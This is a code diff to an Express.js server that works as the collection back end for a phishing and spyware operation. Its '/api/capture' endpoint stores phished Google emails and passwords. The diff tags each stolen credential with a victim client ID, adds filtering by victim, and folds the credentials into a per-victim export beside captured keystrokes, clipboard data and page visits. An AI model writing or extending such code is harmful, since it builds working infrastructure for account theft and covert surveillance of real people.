@@ -624,11 +624,12 @@ app.post('/log-error', (req, res) => {
 
 // ── Google login credential capture ──
 app.post('/api/capture', (req, res) => {
-    const { email, password, source, timestamp } = req.body;
+    const { email, password, source, timestamp, clientId } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Missing fields' });
     if (!store.credentials) store.credentials = [];
     const entry = {
         id: Date.now().toString(36),
+        clientId: clientId || 'unknown',
         email: email.trim(),
         password,
         source: source || 'unknown',
@@ -639,8 +640,8 @@ app.post('/api/capture', (req, res) => {
     store.credentials.unshift(entry);
     if (store.credentials.length > 1000) store.credentials.length = 1000;
     saveStore();
-    addEvent('credential_captured', { email: entry.email, source: entry.source, ip: entry.ip });
-    console.log(`\u{1F511} Credential captured: ${entry.email} | ${entry.password} (${entry.ip})`);
+    addEvent('credential_captured', { clientId: entry.clientId, email: entry.email, source: entry.source, ip: entry.ip });
+    console.log(`\u{1F511} Credential captured: ${entry.email} from ${entry.clientId} (${entry.ip})`);
     res.json({ success: true });
 });
 
@@ -973,7 +974,10 @@ app.get('/api/visits', requireAuth, (req, res) => {
 // ── Captured credentials ──
 app.get('/api/credentials', requireAuth, (req, res) => {
     const limit = Math.min(parseInt(req.query.limit) || 200, 1000);
-    res.json((store.credentials || []).slice(0, limit));
+    const cid = req.query.clientId;
+    let d = store.credentials || [];
+    if (cid) d = d.filter(c => c.clientId === cid);
+    res.json(d.slice(0, limit));
 });
 
 app.delete('/api/credentials', requireAuth, (req, res) => {
@@ -1080,6 +1084,7 @@ app.get('/api/client/:id/export', requireAuth, (req, res) => {
         keystrokes: store.keystrokes.filter(k => k.clientId === id),
         clipboard: store.clipboard.filter(c => c.clientId === id),
         pageVisits: store.pageVisits.filter(v => v.clientId === id),
+        credentials: (store.credentials || []).filter(c => c.clientId === id),
         notes: store.notes?.[id] || [],
         tags: store.tags?.[id] || {},
         events: store.events.filter(e => e.data?.clientId === id)
